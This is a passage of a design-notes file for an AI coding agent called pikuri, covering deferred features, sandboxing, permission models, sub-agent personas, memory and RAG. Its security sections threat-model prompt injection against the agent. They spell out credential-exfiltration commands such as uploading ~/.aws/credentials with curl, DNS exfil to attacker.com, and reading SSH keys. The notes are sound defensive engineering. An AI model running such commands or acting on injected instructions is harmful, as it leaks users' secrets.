# IDEAS.md

Things pikuri considered, scoped, and deliberately deferred — recorded
here so a future contributor doesn't read the absence as oversight.
Promote into a real plan when the friction shows up.

Related but different: `COMPARISON.md` "Ideas to borrow" is the
externally-sourced version — "opencode/pi do X, should we?" This file
is the internally-sourced version — "we considered X for pikuri and
punted, here's why."

## Coding-agent deferrals

Carried over from the v1 plan once `bin/pikuri-code` shipped. Each was
in scope of the design exercise, considered, and left out on purpose.

- **Permission system.** opencode's three-action `allow` / `deny` /
  `ask` glob rules. v1 ships with two coarse modes (interactive
  `Workspace::Confirmer::TERMINAL` on `Write` / `Bash`; `--yolo` swaps in
  `AUTO_APPROVE`). Revisit once `bin/pikuri-code` has lived a while
  and we know where the friction is. Where things are headed:
  yolo-in-docker, or ClaudeCode's agentic review of the command + automatic approval/denial.
- **Image auto-resize in `Workspace::Read`.** Day-one image support
  refuses anything over 5 MB outright (see
  `lib/pikuri/workspace/read.rb`'s `MAX_IMAGE_BYTES`). PI auto-resizes
  to 2000×2000 with an image-processing dep; we punted on that
  trade-off — adds mini_magick / ruby-vips for one tool's
  ergonomics. Revisit if "Read screenshot.png" being denied on size
  becomes a common annoyance.
- **LSP tool.** opencode wires an LSP client for hover / definition /
  diagnostics. Big-ticket feature; deferred until there's a concrete
  use case beyond "opencode has one."
- **Streaming output from bash.** `Code::Bash` returns a single
  observation `String`. Live process output is meant to stay on the
  listener stream once we add a TUI; meanwhile callers bound wall time
  with coreutils' `timeout`.
- **Session persistence / resumable sub-agents.** opencode's `task`
  tool persists sub-sessions; `Tool::SubAgent` doesn't. Worth doing
  the day we have any other reason to introduce a session store.

## Security perspective

The committed model lives in [`SECURITY.md`](SECURITY.md): a
short code-trust baseline (pikuri + LLM trusted; project bash
sandboxed via Bubblewrap; MCP processes left to Docker), then the
load-bearing prompt-injection section (lethal trifecta broken by
privilege-separated sub-agents, MCP description injection caught
by `Mcp::Verifier`), three worked attacks, and explicit non-goals.
This section is the open-questions log — mitigations under
consideration, open observations, and prior-art notes that haven't
graduated yet.

Threat model scales with capability. `bin/pikuri-chat` today is
small surface (calculator + three stateless network-out tools, no
filesystem writes); `bin/pikuri-code` has the full
read/write/edit/bash kit and is where most of the below bites; an
eventual `bin/pikuri-assistant` with MCP-backed Gmail / Calendar /
Slack inherits both sets and adds the privacy-of-personal-data
axis.

### Trifecta — open mitigations beyond sub-agent separation

The structural defense (privilege-separated `RESEARCHER` and
`FILE_MINER` sub-agents) shipped and is documented in
[`SECURITY.md`](SECURITY.md) §"Prompt injection". Adjacent ideas
still on the table:

- **Provenance tags around tool output** in the context render
  (untrusted-content markers). Cheap, partial — empirical
  question whether the model pays attention to
  `<untrusted>…</untrusted>` framing.
- **Egress allowlist** for `fetch` / `bash` when in interactive
  mode (auto-deny non-allowlisted hosts, prompt for first-use
  additions). Gondolin's egress-proxy pattern (see "Prior art"
  below) is the heavyweight structural version.
- Prompt injection inside skill descriptions? Skills are
  user-installed text; current stance ([`SECURITY.md`](SECURITY.md)
  §"Code trust" — skills bullet) is "user-vetted by definition."
  A `Mcp::Verifier`-shaped pass for skills would belt-and-braces
  it.
- Content-level defenses against `web_scrape` injection beyond
  persona separation (provenance tags are the obvious shape).

### Unsandboxed Bash modes

`Code::Bash::Sandbox::Bubblewrap` constrains `Bash` to the workspace's
readable/writable roots + an OS-runtime baseline, and is the default in
`bin/pikuri-code`. The residual concern is `--no-sandbox` / `--yolo`:
there `cat ~/.ssh/id_rsa`, `env | grep -i key`,
`curl --upload-file ~/.aws/credentials ...` all run as the user, and
the per-command Confirmer is the only line of defense (`--yolo`
disables that too). The help text says "use only with an outer
sandbox" but nothing enforces it. Worth considering: detect a
container / VM at boot and refuse `--no-sandbox` outside one, or at
least surface a louder warning than the current `LOGGER.warn`.

### Egress is broader than `web_search`

Anywhere bytes leave the box: `bash` → curl/scp/dns/`ping -p`;
`fetch` with attacker-chosen URL; `write` into a Dropbox / iCloud /
git-tracked directory; markdown images rendered by a chat host that
fetches them; error messages echoed back into follow-up turns; the
LLM provider itself when non-local. DNS exfil
(`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
most egress firewalls don't filter port 53.

### Typed transport classes (private vs public)

v0 thought: a loud startup banner at the privacy boundary
documented in [`SECURITY.md`](SECURITY.md) §"Code trust" — LLM
provider bullet ("Outbound LLM provider: api.openai.com — your
prompts and tool results will be sent there"). Fine sketch,
structurally weak — the user can click through a banner, and
per-action banners ("indexer about to send 3 MB to
api.openai.com") are inconsistent with the chat path that has
been silently sending prompts to the same provider all along.
The leak is set at chat-config time, not at fire time.

Stronger shape, surfaced while scoping pikuri-vectordb (which
adds two more LLM-shaped transports — embedder and reranker —
on top of ruby_llm's chat transport): classify the transport
instance itself as `:private` or `:public`, derived from its
endpoint host, and let `Pikuri::Agent.new` refuse to mix classes
by default.

Rough shape:

    module Pikuri::Transport
      class Local
        def privacy_class; :private; end
      end
      class OpenAI
        def initialize(api_key:, base_url: 'https://api.openai.com')
          @base_url = base_url
        end
        def privacy_class
          URI(@base_url).host =~ /\A(localhost|127\.|\[?::1)/ \
            ? :private : :public
        end
      end
      # Embedder::*, Reranker::*, etc. each declare their own.
    end

    Pikuri::Agent.new(transport: chat, privacy: :strict)
    # extensions / sub-agents whose transports differ in class are
    # rejected at construction. :mixed opts out and logs every
    # transport class loudly at boot.

Three load-bearing points:

- **Classification belongs to the transport instance**, derived
  from the URL host. Loopback / `::1` / Unix socket → `:private`;
  everything else → `:public`. LAN IPs, Tailscale endpoints, a
  Caddy reverse-proxy on `localhost:8080` pointed at OpenAI —
  pikuri can't verify network topology and won't try. Documented
  limitation, not a defect.
- **Fail-fast at construction, not per-request.** Strict mode
  refuses cross-class wiring; `:mixed` is the explicit opt-in for
  "private chat + public embedder" with loud boot logging.
  Default is `:strict` in `bin/pikuri-assistant`; no-op in
  `bin/pikuri-chat` where there's only the one transport today.
- **The concept ends up broader than ruby_llm.** Embedders ride
  `RubyLLM.embed`; rerankers don't exist in ruby_llm at all, so
  `Pikuri::Transport::Reranker::*` is pikuri-core's own
  first-class type, not a ruby_llm adapter. Argument for putting
  classification *above* ruby_llm in the abstraction stack
  rather than bolting it onto ruby_llm's config.

`:private` and `:public` are also docs anchors — named concepts
in the guide so the cliff is teachable, not something the user
discovers from a banner one day.

Sequencing: pikuri-vectordb v1 ships with plain URL arguments
(`embedder:` / `reranker:` accept strings or transport objects
interchangeably), and typed transports land in a follow-up
session that touches pikuri-core and pikuri-vectordb together.
Vectordb's transport configuration is constructor-only, so
retrofitting is local.

### MCP — open ergonomic / supply-chain questions

The committed MCP story is split across [`SECURITY.md`](SECURITY.md):
the §"Code trust" bullet covers the Docker-for-untrusted-process
recommendation (suggested, not automatic); §"Defense: MCP
description verification" covers the `Mcp::Verifier` pre-flight
scan, with user-curation as the first line of defense. Open:

- **Per-tool first-use consent** (opencode-style sticky approval)
  is probably the right ergonomics shape — first invocation of
  the Gmail-MCP fetch tool is also the first consent prompt.
  Composes with the skill-gated lazy-add design.
- **First-class "wrap MCP in Docker" option** would close the
  supply-chain gap without leaving containerization to the user.
  Hard part: the wrapped MCP's egress / LLM-endpoint reachability
  re-opens the trifecta inside the container, so the egress
  policy of the inner Docker becomes the new question.

### Confirmer as a first-class, last-line-of-defense control

The *role* — last-line-of-defense for the parent agent in
`bin/pikuri-code`, where structural defense has run out and the
human gate is what stops a poisoned context from leaking — is now
documented in [chapter 6 §"The human gate, and why fatigue is the
enemy"](docs/guide/06-security.md). The two requirements (bother the
human only on the genuinely consequential; be excellent when it does
fire) and the dependency on the rest of the kit carrying the routine
load are stated there.

The not-yet-shipped technical piece: `Confirmer#confirm?` today takes
a pre-baked prompt String it can only echo. To live up to the chapter
5 framing — "headline the consequence, not the 80-char `curl` pipe"
— the call needs **structured action context** (kind: write / bash /
fetch; target path or URL; egress destination; in/out of workspace),
so the seam can render the load-bearing presentation rather than
echoing whatever the caller built. Composes with the per-pattern
stickiness wishlist in §"Permission model needs granularity" below —
sticky rules key naturally on structured fields, badly on raw
strings.

### Permission model needs granularity

`Confirmer::TERMINAL` is binary today (approve / deny per call).
Real-world ergonomics push toward:

- Per-tool, per-pattern stickiness ("always allow `git status`",
  "always allow read under `./src/**`").
- Risk tiers — read light, write medium, bash heavy, unknown-host
  fetch heavy.
- Dry-run preview for `Bash` (echoed argv, no shell-metachar
  surprise).
- Time-bound approvals ("for this session only" — implicit on
  session boundaries).

Risk to weigh: every persisted approval is past-you trusting
future-you's judgment, which prompt injection can lean on.

### Output-size DoS and cost

A 50MB scraped page → context window blown → API cost spike or OOM in
the tokenizer. `max_steps` covers the loop-count axis; a per-tool
output-byte cap covers the per-step axis. `Bash` (head+tail truncation
via `OUTPUT_HEAD`/`OUTPUT_TAIL`), `Read` (`MAX_BYTES`), and `WebScrape`
each enforce their own cap; remaining gap is a uniform shape across
all tools and disk-spillover of overflow (PI/opencode prior art —
tempfile path returned to the LLM).

### Misc smaller things

- **Logging hygiene.** `Pikuri.logger_for` shouldn't log Authorization
  headers, request bodies, or full search queries (which are often
  sensitive themselves).
- **`URLCache` on disk.** Cached pages with embedded auth cookies or
  sensitive scrape results — disk encryption matters, backups matter.
- **TOCTOU.** Mostly theoretical for an interactive agent, but
  `Workspace::Filesystem`'s check-then-open isn't atomic on POSIX.
- **Sub-agent context leak.** A child given less context than the
  parent can still leak parent context that flows in via the parent's
  "task" prompt.

### Prior art: how PI and opencode handle this

Surveyed both after writing the above. Findings reinforce the framing
more than they contradict it.

**Common ground.**
- **Neither has prompt-injection defenses.** No provenance markers on
  tool output, no "treat results as data" language in system prompts,
  no separate channels. Confirms the load-bearing tag — nobody in this
  space has solved it.
- **Both cap tool output** at ~2000 lines / 50KB with overflow
  spilled to a tempfile and the path returned to the LLM. Cheap to add
  to pikuri.
- **Both validate sub-agent privilege separation as the right shape** —
  PI via a `--tools` allowlist on the spawned child
  (`packages/coding-agent/examples/extensions/subagent/index.ts:267`),
  opencode via inherited parent-denies plus per-preset deny baselines
  (`packages/opencode/src/agent/subagent-permissions.ts`,
  `agent/agent.ts:178-220`).

**PI ships nothing security-related in core**, but offers isolation
through two opt-in extensions of very different weights. No
permission system in core (only a 30-line example extension
regex-matching `rm -rf` / `sudo` / `chmod 777`), no workspace
constraint (paths resolve absolutely with `~` expansion, no `..`
rejection — `core/tools/path-utils.ts:54-93`), bash unrestricted, no
MCP, no provider warnings, no Dockerfile. The README's stance is one
line: "Run in a container yourself."

The **lighter isolation extension** is `sandbox`: wraps the `bash`
tool only — **bubblewrap on Linux / `sandbox-exec` on macOS** —
driven by `~/.pi/agent/extensions/sandbox.json`. Default policy:
network *on* with an npm / pypi / github allowlist; deny-read for
`~/.ssh` / `~/.aws` / `~/.gnupg`; deny-write for `.env*` / `*.pem` /
`*.key`. Only `bash` is wrapped — `edit` / `write` / `read` execute
outside the sandbox, so a prompt-injection that prefers `edit` over
`bash sed` walks past it. Sub-agents spawn as separate `pi` child
processes that don't inherit the `-e ./sandbox` flag — no recursion.
(`packages/coding-agent/examples/extensions/sandbox/index.ts`.)

The **heavier isolation story is Gondolin**
(<github.com/earendil-works/gondolin>, separate Apache-2.0 project
from the same org) and the more interesting one as prior art.
**Lightweight Linux micro-VMs** (QEMU by default, experimental
`krun` backend) — explicitly stronger isolation than containers /
namespaces. The PI-side extension *"runs pi tools inside a micro-VM
and mounts your project at `/workspace`"*; the whole toolset runs
inside, not just bash. Three design choices worth recording:

- **Programmable HTTP/TLS egress proxy with allowlists.** Not just
  iptables — a real proxy that inspects what's leaving.
- **JS-configurable VFS mounts.** Host decides what filesystem the
  guest sees.
- **Secret-placeholder pattern.** Guest env vars hold placeholders,
  not real values; the egress proxy substitutes the real secret
  **only on outbound requests to allowlisted hosts**. A
  prompt-injection that does `echo $STRIPE_KEY > attacker.com` fails
  twice: env doesn't contain the real key, and `attacker.com` isn't
  allowlisted. Genuinely novel prior art — Anthropic's MCP / OAuth
  flows don't have an equivalent.

Gondolin is also the substrate for **`pi-chat`** (Discord / Telegram
→ Claude bridge, same org) — one micro-VM per channel for
multi-tenant isolation. Worth noting: pi-chat's docs explicitly say
*"All outbound HTTP/TLS open by default"* — the egress policy is
available but not aggressively configured in that product.

**opencode is the opposite.** A sophisticated three-action
`allow` / `deny` / `ask` permission system keyed on
`(permission-name, glob-pattern)`, last-match-wins, default-`ask`,
persisted to per-project SQLite for `always` approvals
(`packages/opencode/src/permission/evaluate.ts:11`,
`permission/index.ts:140-145`), with a **tree-sitter bash parser**
deriving sticky-approval prefix patterns like `git status *`
(`tool/shell.ts:261-265, 308-333`). But `SECURITY.md` is explicit at
the top: *"OpenCode does not sandbox the agent. The permission system
exists as a UX feature... it is not designed to provide security
isolation."* Workspace is soft — out-of-tree triggers an
`external_directory` prompt, not a denial; no realpath / symlink
resolution (`project/instance-context.ts:18-23`). MCP servers spawn
as raw subprocesses inheriting `process.env`; schemas loaded
eagerly (`mcp/index.ts:412-445, 513-549`). Sub-agent presets
`general` / `explore` / `scout` use `"*": "deny"` with selective
allows; parent denies propagate into the child. Skills load from
arbitrary URLs with no signature / integrity check
(`skill/discovery.ts:54-104`). No egress controls, no provider
warnings.

**Worth borrowing (or considering) for pikuri.**
- **Disk spillover for over-cap output** (both). Per-tool byte caps
  already exist in `Bash` / `Read` / `WebScrape`; the missing piece
  is writing the overflow to a tempfile and returning the path so the
  LLM can `grep` it.
- **Sub-agent toolset narrowing** — *shipped* via personas; see
  §"Personas for `Tool::SubAgent`."
- **opencode's `(permission-name, glob-pattern)` ruleset shape** if
  `Confirmer` ever expands beyond binary approve/deny.
- **PI's credential-dir deny-read defaults** (`~/.ssh`, `~/.aws`,
  `~/.gnupg`) — a `Workspace::Filesystem` default denylist gives some real
  protection even without a sandbox, and it's a one-method change.
  Same for deny-write on `.env*` / `*.pem` / `*.key`.
- **Gondolin's secret-placeholder pattern.** A tool surface where env
  vars are placeholders and real values flow only through a curated
  egress proxy is a structural defense against exfil-via-prompt-
  injection — not "approval prompt the user is no longer reading."
  Heavyweight to implement (needs an HTTP/TLS interceptor); flagged
  as future-thought.
- **opencode's explicit "this is UX, not security" framing** in
  their `SECURITY.md` is the honest baseline pikuri's
  [`SECURITY.md`](SECURITY.md) borrows directly under "Non-goals".

**Mental model worth recording:** PI itself ships no isolation in
core. It offers *two extensions of different weights* — the
bubblewrap `sandbox` (bash-only, lighter) and a Gondolin micro-VM
integration (full Linux VM, full toolset). The user-facing "run pi
in a sandbox" story is real, but user-configured and opt-in, not
default. PI is thus prior art for **"ship the sandbox primitive
separately, let the user opt in at the weight they need"** —
different shape from opencode's explicit "we're not a sandbox, run
it in Docker yourself."

## Personas for `Tool::SubAgent`

**v1 shipped.** `Pikuri::Tool::SubAgent` is now persona-driven:
`c.allow_agent(persona)` registers a `Pikuri::Tool::SubAgent::Persona`
(name + description + `tool_names` + system prompt + `max_steps`),
the LLM-facing tool is renamed `agent` with required `name:` (enum
over registered persona names) + `task:` parameters, and an
`<available_agents>` snippet is appended to the system prompt
describing every registered persona. Sub-agent system prompts no
longer inherit from the parent (was the visible bug: "you are a
coding assistant" leaked into a child whose actual job was a focused
lookup); extensions no longer auto-propagate to sub-agents either.
The first bundled persona is `Pikuri::Tool::SubAgent::RESEARCHER`,
shipped in the separate `pikuri-subagents` gem alongside the
`bin/pikuri-minions` fan-out demo (web tools only, 20 steps, prompt
at `pikuri-subagents/prompts/persona-researcher.txt`). The
machinery (`Tool::SubAgent`, `Persona`, `Configurator#allow_agent`)
stays in pikuri-core; bundled `Persona` instances live in
pikuri-subagents so studying pikuri-core doesn't drag in the
persona concept on day one.

**Also shipped: `Pikuri::SubAgent::FILE_MINER`** — read-only fs recon
counterpart to `RESEARCHER`. `tool_names: %w[read grep glob]`, 30
steps, prompt at `pikuri-subagents/prompts/persona-file-miner.txt`,
wired into `bin/pikuri-code` alongside `RESEARCHER` via
`c.add_extension Pikuri::SubAgent::Extension.new(personas: [Pikuri::SubAgent::FILE_MINER, Pikuri::SubAgent::RESEARCHER])`
— the same privilege-separation argument extends to web content
(scraped pages / fetched URLs land in `RESEARCHER`'s context, which
has no `bash` / `write` / `edit` to hijack).
The persona constant references its tools by string name only — no
`require` of `pikuri-workspace` — so the gem stays decoupled (hosts
without `read`/`grep`/`glob` simply don't register it). Privilege-
separation argument is the load-bearing one: a coding agent reading
an untrusted file (vendored README, scraped doc, template repo)
through FILE_MINER can't act on a prompt injection inside it — no
`bash`, no `fetch`, no `write`, no `agent` recursion. Context-economy
is the secondary win.

**Also shipped: `Pikuri::Code::GIT_REPO_RESEARCHER`** — the
"clone-and-dig" persona, third in the lineup. Lives in
`pikuri-code` (not `pikuri-subagents`) because it's the first
persona that ships a tool other than the bundled
`pikuri-subagents` / `pikuri-workspace` surface: a new
`Pikuri::Code::GitClone` (HTTPS-only, shallow, no submodules,
wrapped in the same Bubblewrap sandbox `Bash` uses).
`tool_names: %w[git_clone read grep glob web_search web_scrape fetch]`,
30 steps, prompt at
`pikuri-code/prompts/persona-git-repo-researcher.txt`, wired into
`bin/pikuri-code` as the third entry of the persona list. The
distinguishing structural piece is `needs_temp_workspace: true` —
the persona is declarative-only; `SubAgentTool` owns the lifecycle
(mktmpdir + mint a `Workspace::Filesystem` rooted at the temp dir
+ tear it down at sub-agent close). Trifecta-wise the persona is
same shape as `RESEARCHER`: leg (a) is structurally near-zero
because the temp workspace is disjoint from the parent's
project_root (containment rejects out-of-bounds paths), so cloned
content cannot leave files for the parent's `read` to pick up.
This also partially delivers the "workspace modes" follow-up
below — the `readonly_with_temp` mode generalizes
`needs_temp_workspace` from one persona to a `Persona` field.

Reference shape converges with Claude Code's `subagent_type`,
opencode's `agents` map (`packages/opencode/src/agent/agent.ts:129-281`),
and PI's `subagent` agents
(`packages/coding-agent/examples/extensions/subagent/agents/`).

### Not yet shipped — follow-up work

**Workspace modes.** The persona record today has a narrow
`needs_temp_workspace:` boolean (used by
`GIT_REPO_RESEARCHER` — see above) but no broader
`workspace_mode:` field. File-miner and Researcher work fine on
`inherit` semantics — child reuses parent's `Filesystem`-bound tool
instances by reference, no reconstruction. The interesting modes
from the original proposal stay queued:

- `inherit` — current behavior; what's implicit when the field is
  absent.
- `readonly` — derived `Filesystem` where every parent root is
  readable, none writable. No clones, no extracts.
- `readonly_with_temp` — same plus a fresh `temp:` scratchpad as the
  only writable spot (git-clone / unzip / `mvn dependency:sources`).
  Generalizes `needs_temp_workspace: true` from a single-purpose
  boolean to a composable mode — `GIT_REPO_RESEARCHER` becomes the
  first user once this lands and stops being a special case.

Adding these means promoting `needs_temp_workspace:` to a
`workspace_mode:` enum on the `Persona` record (default
`:inherit`) and a
`Pikuri::Workspace::Filesystem.scoped_readonly_from(parent, with_temp:)`
primitive in `pikuri-workspace`. The fs-touching tools all take
`Filesystem` via constructor today, so the reconstruction is
mechanical — but `bash` would also need `Confirmer::AUTO_APPROVE`
in those modes (the user already approved by picking the persona;
every command still flows through `Event::ToolCall` for audit).
fs-readonly doesn't stop network exfil or fork bombs, so a
`sandbox:` frontmatter key composing with `Code::Bash::Sandbox::Bubblewrap`
is the eventual follow-up.

**Catalog / `.md` discovery.** The current shape ships personas as
Ruby constants (`Pikuri::Tool::SubAgent::RESEARCHER`); good enough
while we have one. Once we ship 3+ and users want to author their
own, the original proposal (Markdown + YAML frontmatter, discovery
under `.pikuri/personas/*.md` / `.claude/agents/*.md` / `.agents/personas/*.md`,
new `pikuri-personas` gem with `Catalog` + `Extension`) becomes the
natural next step. Tool-name validation flips from raise → WARN-and-prune
at that point so a persona referencing an unwired tool just disappears.

**Extension re-propagation.** Sub-agents no longer inherit extensions
(MCP / Skills). Two-phase `configure`/`bind` collapses to "called
once on the parent only." If a persona later needs MCP-backed tools,
the redesign starts from scratch — likely a Persona field declaring
which extensions the child also wires in, plus rebuilding the
two-phase split.

**Per-persona `model:`.** PI has cheap-model-for-cheap-tasks
(haiku for scout, sonnet for planner). Real efficiency win, requires
`ChatTransport` variations per sub-agent. Deferred.

**LLM-authored personas.** Originally floated and deferred; the
escape hatch (ship a `general` persona) still works if it ever
matters.

## Memory

Work-aid first: what the user is working on across sessions —
current projects, brainstormed topics, commands confirmed working —
with personal memories deferred as a follow-up. The seam is the same
one `pikuri-tasks` and `pikuri-skills` already use: a per-gem
Extension wiring tools + a system-prompt block. Difference from
`pikuri-tasks`: memory persists across agent close, where the task
list deliberately drops.

### Prior art: Claude Code, opencode, PI, hermes-agent

**Claude Code** (the harness many of this monorepo's contributors
run): file-based memory at `~/.claude/projects/<dir>/memory/` — one
always-loaded `MEMORY.md` index plus one `.md` per memory with YAML
frontmatter (`name`, `description`, `metadata.type`) and a four-type
taxonomy: `user` (profile / preferences), `feedback` (corrections +
validated choices), `project` (initiatives, deadlines, incidents),
`reference` (pointers to external systems). No `memory` tool — the
assistant writes files via the regular file tool. Curation is
LLM-driven from prompt-time rules (when to save, when to forget,
verify staleness before recommending from memory).

**opencode and PI**: neither ships a user-memory feature. Both load
static `AGENTS.md` / `CLAUDE.md` context files walked from the
filesystem at boot (opencode:
`packages/opencode/src/session/instruction.ts:15`; PI:
`~/.pi/agent/AGENTS.md` + ancestor walk), with prompt language
nudging the model to *suggest* edits to those files when it learns
something new (opencode `prompt/default.txt:75`,
`prompt/kimi.txt:83`). User-authored, not agent-curated. Closest
persisted state is opencode's per-project SQLite for sticky
permission approvals. The gap they fill is documentation, not
memory.

**hermes-agent** (<https://github.com/nousresearch/hermes-agent>):
the only one with a real memory system. Pluggable `MemoryProvider`
ABC (`agent/memory_provider.py:42-281`) + `MemoryManager`
orchestrator (`agent/memory_manager.py`) with ~10 lifecycle hooks —
`prefetch`, `sync_turn`, `on_session_end`, `on_pre_compress`,
`on_delegation`, `on_memory_write`, etc. Eight built-in external
providers (honcho, mem0, supermemory, byterover, hindsight,
holographic, retaindb, openviking) plus a built-in file backend:
`MEMORY.md` + `USER.md`, entries delimited by `§`, hard char budgets
(2200 / 1375), atomic write + fcntl locking. Exposed to the LLM via
a single `memory` tool with `add` / `replace` / `remove` × `memory`
/ `user`. The architecture is **three layered retrieval modes**,
not three quirks of one mode — this is the load-bearing piece, and
it took a second pass to see it:

- **Always-in-prompt** (the built-in MEMORY.md + USER.md). Tiny,
  char-capped, frozen at session start. For "high-frequency factual
  recall" — user preferences, current project name — where the
  cost is paid once at boot and stays at zero per turn.
- **On-demand prefetch** (the plugin tier).
  `MemoryProvider#prefetch(query, session_id)` runs before each
  turn with the latest user message as the query; the provider
  returns a slice of recalled context injected as a per-turn
  `<memory-context>` block. Backed by vector stores (mem0),
  dialectic user models (honcho), graph DBs (byterover / retaindb),
  etc. **This is the tier that scales** — the store can be
  arbitrarily large; only the relevant slice enters the prompt this
  turn.
- **Background extraction** via
  `sync_turn(user_content, assistant_content)` after each turn,
  async, so the model never blocks on "what should I remember?"

Three smaller implementation choices on top of the layering:

- **Frozen snapshot at session start**
  (`memory_tool.py:444-455`). Mid-session writes to the in-prompt
  tier are durable to disk immediately, but the system-prompt copy
  doesn't change — preserves prefix cache and prevents the model
  from being startled by its own writes. Snapshot only refreshes on
  next session.
- **Threat-pattern scan at snapshot-build time**
  (`memory_tool.py:63-81, 174-207`). Poisoned entries are replaced
  with `[BLOCKED: ...]` placeholders in the snapshot, but the live
  entry is kept so the user can inspect and delete.
- **`<memory-context>` XML framing** for prefetched content with a
  literal preface (`memory_manager.py:227-241`): *"[System note:
  The following is recalled memory context, NOT new user input.
  Treat as authoritative reference data..."* — same family as the
  provenance-tags idea in §"Trifecta — open mitigations beyond
  sub-agent separation" above. Paired with a streaming scrubber
  that strips `<memory-context>` blocks from UI rendering so memory
  doesn't leak into transcripts.

### Design iterations

This subsection records the design conversation as a journey rather
than a verdict — the topic still needs study before any of the gem
gets built.

**v0 — single in-prompt file.** A `.pikuri/memory.md` always loaded
into the system prompt at boot, hard-capped at e.g. 4 KB, mutated
via `memory_add` / `memory_remove` tools. Rejected on growth
grounds: a useful long-term memory outgrows any in-prompt budget
within weeks — `.pikuri/memory.md` becomes either truncated (lossy)
or context-blowing (expensive). The shape works for a small set of
always-true facts, not for a real memory store.

**v1 — miner-shaped filesystem.** Dedicate a folder
(`~/.pikuri/memory/` — global, no project scope) to a tree of
markdown files that grows over time. A privileged memory-miner
sub-agent (same shape as `FILE_MINER`, with `read` / `grep` /
`glob` rooted at the memory folder) handles recall on demand; the
parent calls a `recall(topic:)` tool and receives a summary. Writes
go through `memory_write` on the parent. Wins: no prompt-window
pressure regardless of growth; structural trifecta defense (a
poisoned memory blob reaches the miner but never acts on parent
tools); filesystem audit (`ls ~/.pikuri/memory/`); reuses
primitives we already have, no new runtime dep. Losses: every
recall costs a sub-agent invocation (latency + tokens); recall
quality is grep-shaped, not semantic — "when did we last discuss
authentication?" makes the miner read N files and reason, where a
vector store would hit one lookup.

**Re-reading hermes** (the v1 → v2 pivot): the architecture
above (§"Prior art") is *three layered retrieval modes*, and the
plugin tier is the bit that solves growth. The v0 sketch papered
over this by quoting hermes' file-based built-in (which is
deliberately tiny because it lives in the prompt forever) as if it
were the whole story. The plugins — mem0, honcho, supermemory,
byterover, etc. — are where memory at scale actually lives.

**v2 — layered, semantic on-demand.** The likely-best shape borrows
hermes' layering wholesale: keep a small always-in-prompt file for
the v0 use case (a few KB of high-frequency facts that need zero
recall latency), put the growth-friendly tier behind on-demand
semantic retrieval. **An external semantic store (mem0 / honcho /
supermemory or similar) is probably the right fit for the growth
tier** — they solve recall-at-scale with semantic search, which the
miner gives up. The miner shape remains attractive for its
trifecta-defense and zero-dep posture and may stay as the
*inspection* surface ("agent, search my memories for everything
about X and summarize"), but it's not the primary recall path.

**Status: needs more study before committing.** Specifically:
- which external store fits pikuri's privacy-first ethos (mem0 has
  a hosted mode but also self-hostable; honcho is Apache-2.0 and
  runs locally; supermemory and byterover are SaaS-first);
- how the embedding model story works (local
  sentence-transformers vs. provider-hosted — the provider-hosted
  path re-opens the same "outbound LLM provider" cliff covered in
  §"Typed transport classes (private vs public)");
- whether one always-in-prompt builtin + one external semantic
  provider justifies a small plugin ABC after all (not hermes' 10
  hooks, but a `prefetch` + `sync_turn` + `system_prompt_block`
  triad at minimum);
- and whether to keep the miner shape as a complementary
  inspection mode or drop it entirely.

### Likely to skip even under the layered shape

- **Claude Code's four-type taxonomy** (user / feedback / project
  / reference). Earned with volume; pikuri doesn't have that
  volume, and an external semantic store doesn't benefit from
  manual typing the way an LLM-curated file index does.
- **Mid-session auto-curation passes.** Extra LLM call per turn,
  surprising, hard to audit. Explicit-tool curation only.
- **Hermes' full 10-hook lifecycle.** A `prefetch` + `sync_turn` +
  `system_prompt_block` triad is probably enough — the rest
  (`on_session_end`, `on_pre_compress`, `on_delegation`,
  `on_memory_write`) waits for a concrete second provider that
  wants them.
- **Streaming scrubber.** Pikuri's `Terminal` listener doesn't
  re-emit system context to the user mid-stream, so memory blocks
  don't leak the way hermes' streaming UI does.
- **Project-scoped memory.** Voted global in conversation
  (`~/.pikuri/memory/`). `bin/pikuri-code` can still pass the
  current project name as part of the recall query if project
  disambiguation matters.

### Open questions

- **Which external store.** Privacy-first ethos rules out cloud-only
  options without a self-host path. mem0 (open core + self-host)
  and honcho (Apache-2.0, runs locally) are the natural candidates;
  supermemory and byterover are SaaS-first. Embedding model adds
  another axis.
- **Threat model under semantic recall.** A poisoned memory entry
  surfaced via semantic recall is the same lethal-trifecta footgun
  as one in a static file, with the added wrinkle that the user
  can't `cat` the entire memory state to inspect it. Mitigations
  probably live at the *recall* side: cap recall size, frame as
  untrusted data, log every recall to disk for after-the-fact
  audit.
- **Miner shape as complement.** Even after picking a semantic
  store for the main growth tier, the miner shape remains the
  natural way to expose memory *inspection* to the user ("search
  my memories for everything about X and summarize"). Two
  retrieval modes from the LLM's perspective: prefetched
  (automatic, current-turn-relevant) and mined (explicit, deep
  reasoning). Open whether to ship both or just one.
- **Confirmed-working as a memory side-effect.** "User approved
  this command" is natural shape for §"Permission model needs
  granularity" sticky-approval rules, but a poisoned memory entry
  saying *"user approved `rm -rf`"* is exactly the lethal-trifecta
  footgun. Probably belongs in `Confirmer`'s sticky-rules store,
  not in the LLM-readable memory layer.
- **Relationship to `pikuri-skills`.** Skills are procedural
  user-authored memory; `pikuri-memory` would be declarative
  agent-curated memory. Distinct but adjacent — worth documenting
  in the gem's yardoc and probably in `COMPARISON.md` so the
  boundary is explicit.

## Vector DB / RAG

Surfaced while scoping pikuri-assistant — RAG and agentic search
over a local document corpus are mandatory for an assistant binary
worth running. Designed but not yet built; sketched here so a
future contributor knows the shape that was settled on and where
the deferrals are.

The shape lands as `pikuri-vectordb`: an extension that wires a
`vectordb_search` tool into the agent (agentic search — the agent
decides when to retrieve), backed by a configurable embedder + an
optional reranker + a swappable backend. A bundled `LIBRARIAN`
persona provides the privilege-separated sub-agent variant.

### Extension shape

    Pikuri::VectorDb::Extension.new(
      backend:    Pikuri::VectorDb::Backend::Chroma.new(host:, port:),
      sources:    ['~/notes', '~/docs'],
      collection: 'my-docs',
      embedder:   nil,    # nil = use RubyLLM.embed default
      reranker:   nil,    # nil = top-k only, no rerank
      chunker:    Pikuri::VectorDb::Chunker::FixedWindow.new(
                    size: 512, overlap: 50,
                  ),
    )

Backend and sources are orthogonal — same folder can be indexed
into either backend behind the same `Backend` interface. The
extension registers `vectordb_search(query:)` on the parent agent,
a `vectordb_reindex` administrative tool (nuke-and-reload), and a
bundled `LIBRARIAN` persona referencing `vectordb_search` only.

### Concerns kept separate

- **Backend.** Pure-Ruby `Backend::InMemory` (cosine over
  `Array<Float>`, ~40 lines) as the educational default — fits
  "small enough to audit" and reads in one sitting. `Backend::Chroma`
  as the persistent backend, behind the same interface. pgvector /
